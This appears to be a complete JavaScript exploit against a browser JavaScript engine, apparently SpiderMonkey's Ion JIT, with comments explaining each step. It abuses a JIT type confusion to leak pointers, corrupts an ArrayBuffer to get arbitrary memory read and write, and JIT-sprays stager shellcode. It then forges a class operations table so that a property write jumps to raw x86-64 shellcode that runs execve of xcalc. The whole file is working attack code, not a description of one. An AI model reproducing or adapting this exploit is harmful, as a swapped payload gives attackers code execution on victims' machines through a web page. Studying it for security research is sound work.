remote=false;

String.prototype.rjust = function rjust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (chr.repeat(n)+this.toString()).slice(-1*n);
}

String.prototype.ljust = function ljust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (this.toString()+chr.repeat(n)).slice(0,n);
}

String.prototype.hexdecode = function hexdecode(){
  inp=this.toString();
  if (this.length%2 !=0)
  inp='0'+inp.toString();
  out=[];
  for(var i=0;i<inp.length;i+=2)
  out.push(parseInt(inp.substr(i,2),16));
  return out;
}

function print1(num){
  var rep='';
  for(var i=0;i<8;i++){
    rep+=num[i].toString(16).rjust(2);
  }
  console.log("0x"+rep.rjust(16));
  // document.getElementById("demo").innerText += "0x"+rep.rjust(16) + '\n';
}


function data(inp){
  // var bytes=new Uint8Array(8);
  bytes='';
  if ( (typeof inp) == 'string'){
    inp=inp.replace("0x",'');
    inp=inp.rjust(16);
    bytes=new Uint8Array(inp.hexdecode());
  }
  else if (typeof inp == 'number'){
    bytes=new Uint8Array(new Float64Array([inp]).buffer);
    bytes.reverse();
  }
  else if (typeof inp == 'object'){
    bytes=new Uint8Array(8);
    bytes.set(inp);
    bytes.reverse();
  }
  return bytes;
}

function inttod(num){
  // temp=num;
  num.reverse();
  temp = new Float64Array(num.buffer)[0];
  num.reverse();
  return temp;
}

function dtoint(num){
  int=new Uint32Array(new Float64Array([num]).buffer)
  // console.log(int[1].toString(16)+int[0].toString(16));
  return int;
}

function RS(inp,amt){
    amt = amt || 1;
    num='';
    for(var i=0;i<8;i++){
      num+=inp[i].toString(2).rjust(8);
    }
    num=num.slice(0,-1*amt);
    num=num.rjust(64);
    num=parseInt(num,2).toString(16).rjust(16);
    for(var i=0,j=0;i<num.length;i+=2,j++){
      inp[j]=parseInt(num.substr(i,2),16);
    }
    return inp;
}

function LS(inp,amt){
    amt = amt || 1;
    num='';
    for(var i=0;i<8;i++){
      num+=inp[i].toString(2).rjust(8);
    }
    num=num.slice(amt);
    num=num.ljust(64);
    num=parseInt(num,2).toString(16).rjust(16);
    for(var i=0,j=0;i<num.length;i+=2,j++){
      inp[j]=parseInt(num.substr(i,2),16);
    }
    return inp;
}

function sub(inp1,inp2){
    carry=0;
    for(var i=inp1.length-1;i>=0;i--){
        diff=inp1[i]-inp2[i]-carry;
        carry=diff<0|0;
        inp1[i]=diff;
    }
    return inp1;
}

function add(inp1,inp2){
    carry=0;
    for(var i=inp1.length-1;i>=0;i--){
        sum=inp1[i]+inp2[i]+carry;
        carry=sum/0x100;
        inp1[i]=(sum%0x100);
    }
    return inp1;
}

function pp(n)
{
  n.reverse()
  print1(n);
  n.reverse();
}

blah = new Array()
blah.push(new Array(1.1,1.1))
blah.push(new Uint32Array(0x10))

//objectAddress(blah)

function vuln_leak(a1,a2){
  var tmp = blah.slice(0,1);

  var ret = a1[a2]
  for (var i=0; i<1000000; i++){}
  return ret;
}

for (let i=0; i<200; i++) vuln_leak(blah[0],0)


var tmp = vuln_leak(blah[0], 2)
uint_grp =  new data(tmp)

var tmp = vuln_leak(blah[0], 3)
uint_shape =  new data(tmp)


print1(uint_grp)
print1(uint_shape)

buf = []
// for(var i=0;i<100;i++)
// {
//   buf.push(new ArrayBuffer(0x20));
// }


buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));

var abuf = buf[5];

blah1 = new Array()
blah1.push(new Array(1.2,1.2))
blah1.push(new Uint8Array(abuf))

// arr1 = new Array(1.2,1.2)
// fake = new Array(1.2,1.2,1.2,1.2,1.2,1.2,1.2,1.2,1.2,1.2)

//objectAddress(blah1)
// objectAddress(fake)

arr1 = blah1[0]

function write_grp(a1,a2){
  // blah.slice(0,1)
  arr1[a1]=inttod(uint_grp);
  for (let i=0; i<100000; i++){}
}

function write_shape(a1,a2){
  // blah.slice(0,1)
  arr1[a1]=inttod(uint_shape);
  for (let i=0; i<100000; i++){}
}

for (let i=0; i<200; i++) write_grp(0)
for (let i=0; i<200; i++) write_shape(0)

// for (let i=0; i<200; i++) write(0,1.2)

write_grp(2)
write_shape(3)

blah1[1][18]=0x80

leaker = new Uint8Array(buf[7]);
aa = new Uint8Array(buf[6]);

/*
  Now leak the contents of buf[7] to obtain leaks for a Uint Array, and an
  ArrayBuffer
*/

leak = aa.slice(0x50,0x58); // start of the Uint array
group = aa.slice(0x40,0x48); // start of the array buffer
slots = aa.slice(0x40,0x48);
pp(slots)
leak.reverse()
group.reverse()
slots.reverse()

/*
   Since the pointer to the start of the data buffer is right shifted, we first
   need to left shift it.
*/

// LS(group)
// LS(slots)

/* remove the type tag */
leak[0]=0
leak[1]=0

/* Get to the data buffer of the Uint array */
add(leak,new data("0x38"))
// RS(leak)
leak.reverse()

/*
  Set the data pointer of buf[7] using the overflow in buf[6]
  We set this pointer to point to the the address of the data pointer field of
  the Unit that we leaked.
  Thus next time a view is created using this modified ArrayBuffer, it's data pointer
  will point to the data pointer of the Uint array! So when we write something to
  this view, then the data pointer of the leaked Uint array will be overwritten.
  So we now have the power to control the data pointer a Uint array. Thus we can
  leak from any address we want and write to any address just by overwritting the
  data pointer of the Uint Array and viewing/writing to the Uint array.
  Thus we now effectively have an arbitrary read-write primitive!
*/

for (var i=0;i<leak.length;i++)
  aa[0x40+i] = leak[i]

leak.reverse()
// LS(leak)
sub(leak,new data("0x10"))
leak.reverse()

changer = new Uint8Array(buf[7])

function write(addr,value){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    value.reverse()
    for (var i=0;i<8;i++)
      leaker[i]=value[i]
}

function read(addr){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    return leaker.slice(0,8)
}

function read_n(addr, n){
    write(leak,n)
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    return leaker
}

sub(group,new data("0x40")) // this now points to the group member
sub(slots,new data("0x30")) // this now points to the slots member
print1(group)
print1(slots)
group.reverse()
slots.reverse()

aa = read(group) // aa now contains the group pointer
aa.reverse()
print1(aa)
aa.reverse()

grp_ptr = read(aa) // grp_ptr is now the clasp_ pointer
grp_ptr.reverse()
print1(grp_ptr)
grp_ptr.reverse()

/* stager shellode */
buf[7].func = function func() {
  const magic = 4.183559446463817e-216;

  const g1 = 1.4501798452584495e-277
  const g2 = 1.4499730218924257e-277
  const g3 = 1.4632559875735264e-277
  const g4 = 1.4364759325952765e-277
  const g5 = 1.450128571490163e-277
  const g6 = 1.4501798485024445e-277
  const g7 = 1.4345589835166586e-277
  const g8 = 1.616527814e-314
}

/* JIT compile the shellcode */
for (i=0;i<100000;i++) buf[7].func()

/* get the address of the executable region where Ion code is located */

slots_ptr = read(slots)
slots_ptr.reverse()
print1(slots_ptr)
slots_ptr.reverse()

func_ptr = read(slots_ptr)
func_ptr[6]=0
func_ptr[7]=0
func_ptr.reverse()
print1(func_ptr)
func_ptr.reverse()

func_ptr.reverse()

add(func_ptr,new data("0x30"))
func_ptr.reverse()

func_ptr.reverse()
print1(func_ptr)
func_ptr.reverse()

jit_ptr=read(func_ptr);
jit_ptr.reverse()
print1(jit_ptr)
jit_ptr.reverse()

jitaddr = read(jit_ptr);

/*
  Find the address of the shellcode in the executable page.
  We go back one page and then search 2 pages from there2
*/

jitaddr[0]=0
jitaddr[1]=jitaddr[1] & 0xf0

jitaddr.reverse()
print1(jitaddr)
jitaddr.reverse()

jitaddr.reverse()
sub(jitaddr,new data("0xff0"))
jitaddr.reverse()

for(j=0;j<3;j++){
  asdf = read_n(jitaddr,new data("0xff0"))
  offset=-1;
  for (var i =0;i<0xff0;i++)
  {
    if (asdf[i]==0x37 && asdf[i+1]==0x13 && asdf[i+2]==0x37 && asdf[i+3]==0x13 && asdf[i+4]==0x37 && asdf[i+5]==0x13 && asdf[i+6]==0x37 && asdf[i+7]==0x13){
      offset=i;
      break
    }
  }

  /* we found the shellcode */
  if(offset!=-1)
    break

  jitaddr.reverse()
  add(jitaddr,new data("0xff0"))
  jitaddr.reverse()
}

offset = offset+8+6 // add the offset of the magic constant and also the mov instruction
jitaddr.reverse()
add(jitaddr,new data(offset.toString(16)))
jitaddr.reverse()
console.log(offset);
pp(jitaddr)

function slice(array, start, end){
  out = new Uint8Array(end-start);
  for(i=start,j=0;i<end;i++,j++)
    out[j]=array[i]
  return out
}

/* JS Class object */
jsClass = read_n(grp_ptr,new data("0x30"));

name = slice(jsClass,0,8)
flags = slice(jsClass,8,16)
cOps = slice(jsClass,16,24)
spec = slice(jsClass,24,32)
ext = slice(jsClass,40,48)
oOps = slice(jsClass,56,64)

group.reverse()
add(group,new data("0x60"))
group.reverse()

eight = new data("0x8")

function addEight()
{
  group.reverse()
  add(group,eight)
  group.reverse()
}

/* Lol, can I get more lazier :).... */
function write1(addr,value){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    // value.reverse()
    for (var i=0;i<8;i++)
      leaker[i]=value[i]
}

/* We will be writting our crafted group to this address. So we save it now*/
backingbuffer = group.slice(0,8)

oops = group.slice(0,8)
oops.reverse()
add(oops,new data("0x30"))
oops.reverse()

write1(group,name)
addEight()
write1(group,flags)
addEight()
write1(group,oops)
addEight()
write1(group,spec)
addEight()
write1(group,ext)
addEight()
write1(group,oOps)
addEight()

/* set the addProperty function pointer to our shellcode */
write1(group,jitaddr)

sc_buffer = new Uint8Array(0x1000);
buf[7].asdf=sc_buffer

/* Leak the address of the shellcode UnitArray */
slots_ptr.reverse()
add(slots_ptr,eight)
slots_ptr.reverse()

function read(addr){
    for (var i=0;i<8;i++)
      changer[i]=addr[i]
    return slice(leaker,0,8)
}


sc_buffer_addr = read(slots_ptr)
sc_buffer_addr[6]=0
sc_buffer_addr[7]=0

/* Now get to the buffer of the shellcode array */
sc_buffer_addr.reverse()
add(sc_buffer_addr,new data("0x38"))
sc_buffer_addr.reverse()

/* ptr is the pointer to the shellcode (currenty it's rw) */
ptr = read(sc_buffer_addr)

ptr.reverse()
print1(ptr)
ptr.reverse()

/* convert the pointer to the shellcode buffer to float */
ptr.reverse()
ss=inttod(ptr)
ptr.reverse()

/* Shellcode for execve("/usr/bin/xcalc",[],["DISPLAY=:0"]) */
sc = [72, 141, 61, 73, 0, 0, 0, 72, 49, 246, 86, 87, 84, 94, 72, 49, 210, 82, 72, 141, 21, 87, 0, 0, 0, 82, 84, 90, 176, 59, 15, 5, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 47, 117, 115, 114, 47, 98, 105, 110, 47, 120, 99, 97, 108, 99, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 68, 73, 83, 80, 76, 65, 89, 61, 58, 48, 0]

/* Copy the shellcode to the shellcode buffer */
for(var i=0;i<sc.length;i++)
  sc_buffer[i]=sc[i]

write1(aa,backingbuffer)

/*
  call the addProperty function pointer
  the pointer to the shellcode buffer (sss) is present in rcx
*/
buf[7].jjj=ss

// var tt = vuln_leak(arr1,2)
// print1(new data(tt))
